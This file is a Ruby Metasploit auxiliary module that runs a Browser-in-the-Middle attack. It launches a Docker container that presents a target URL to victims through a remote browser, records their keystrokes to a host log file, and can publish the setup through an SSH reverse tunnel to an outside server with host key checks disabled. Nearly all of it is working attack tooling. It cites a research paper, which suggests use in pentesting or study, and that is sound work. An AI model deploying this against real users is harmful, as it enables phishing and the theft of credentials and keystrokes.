require 'msf/core'
require 'open3'
require 'fileutils'

class MetasploitModule < Msf::Auxiliary

  # Module Metadata
  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Browser in the Middle Metasploit module',
      'Description' => %q{
        This module starts a Docker container implementing a Browser in the Middle (BitM) attack with a specified URL, and a keylogger running in it.
      },
      'Author'      => [ 'Francesco De Nunzio' ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'URL', 'https://link.springer.com/article/10.1007/s10207-021-00548-5' ]
        ]
    ))

    # Define user-supplied options
    register_options(
      [
        OptString.new('URL', [ false, 'The URL exposed from the Docker Container to the victim', 'https://google.com/' ]),
        OptInt.new('PORT', [ false, 'The PORT exposed from the host computer', 8888 ]),
        OptString.new('LOG', [ false, 'PATH where to find the folder with keylogger logs.', '~/BitM_LOGS/' ]),
        OptString.new('REVERSE_PROXY', [ false, 'Server that provides reverse proxy service.', nil ])

      ]
    )
  end

  # Custom command for cleanup
  def auxiliary_commands
  {
      'cleanup' => 'Stop docker containers and clean up resources'
  }
  end

  def cmd_cleanup(*args)
    cleanup_command
  end

  # Cleanup method
  def cleanup_command
    print_status("Cleanup requested...")
  
    # Command to list all container's names 
    docker_ps_command = "docker ps -a --format '{{.Names}}'"
    stdout = run_command(docker_ps_command, "Failed to list Docker containers.")
    return if stdout.nil? # There are no containers, so nothing to clean
  
    container_names = stdout.split("\n")
      
    # Filter containers whose names start with "bitm_"
    containers_to_cleanup = container_names.select { |name| name.start_with?("bitm_") }
  
    # If there are no bitm containers
    if containers_to_cleanup.empty?
      print_status("No containers found with names starting with 'bitm_'.") 
      return
    end
        
    # for loop to kill and remove each container
    containers_to_cleanup.each do |container_name|
      docker_kill_command = "docker kill #{container_name}"
      run_command(docker_kill_command, "Failed to kill container: #{container_name}") or return
      print_good("Successfully killed container: #{container_name}")

      docker_rm_command = "docker rm #{container_name}"
      run_command(docker_rm_command, "Failed to remove container: #{container_name}") or return
      print_good("Successfully removed container: #{container_name}")
    end

  end
  

  def run
    # Retrieve the options provided by the user
    url = datastore['URL']
    port = datastore['PORT'] 
    rev_proxy = datastore['REVERSE_PROXY'] 

    # Generate a random container name like bitm_xxxxxx
    container_name = generate_random_name

    log_dir = File.expand_path(datastore['LOG']) # Expand the path to handle ~

    # Define the full path for the log file
    log_file = File.join(log_dir, "#{container_name}.txt")

    # Ensure the LOG directory exists and create the log file
    begin
      # Create the directory if it doesn't exist
      FileUtils.mkdir_p(log_dir) unless Dir.exist?(log_dir)
      
      # Create the log file if it doesn't exist
      FileUtils.touch(log_file) unless File.exist?(log_file)

      print_status("LOG directory and log file created successfully.")
    rescue StandardError => e
      print_error("Failed to create LOG directory or log file: #{e.message}")
      return
    end

    # Print the parameters
    print_status("The URL parameter is: #{url}")
    print_status("The PORT parameter is: #{port}")
    print_good("The LOG file is : #{log_file}")

    # Run Docker container
    docker_command = "docker run -d -p #{port}:8080 -v #{log_file}:/LOGS/keystrokes.log --name #{container_name} francescodenu/bitm:latest"
    container_id = run_command(docker_command, "Failed to start Docker container.")
    return if container_id.nil?

    get_container_id_command = "docker ps -q -f name=#{container_name}"
    container_id = run_command(get_container_id_command, "Failed to retrieve container ID.")
    return if container_id.nil? || container_id.empty?

    docker_exec_command = "docker exec -d #{container_id} /bin/bash -c \"export DISPLAY=:10; /opt/web #{url} >> /LOGS/web.log 2>&1\""
    run_command(docker_exec_command, "Failed to execute the command inside the Docker container.") or return
      
    print_status("Docker container started successfully, Container Name: #{container_name}, Container ID: #{container_id}")
    print_good("You can check the result at http://localhost:#{port}/index.html")

    if rev_proxy.nil? || rev_proxy.empty?
      print_status('No reverse proxy server provided. Running without reverse proxy.')
    else
      print_status("Using reverse proxy server: #{rev_proxy}")
      rev_proxy_command = "docker exec -d #{container_id} /bin/bash -c \"apt install openssh-client -y; ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N \\\"\\\"; nohup ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -R 80:localhost:8080 #{rev_proxy} > /LOGS/reverseproxy.log 2>&1 &\""
      output = run_command(rev_proxy_command, "Failed to use reverse proxy server.") or return
      #print_good(output)
      print_good("Check the output of the reverse proxy: docker exec #{container_name} cat /LOGS/reverseproxy.log")
    end

  end
  
  # Generate a random name for the Docker container
  def generate_random_name
    "bitm_" + (0...6).map { [*'a'..'z', *'0'..'9'].sample }.join
  end

  # Helper method to run a command and stop execution on failure
  def run_command(command, error_message)
    stdout, stderr, status = Open3.capture3(command)
    unless status.success?
      print_error(error_message)
      print_error("Error Output: #{stderr.strip}")
      return nil
    end
    stdout.strip
  end

end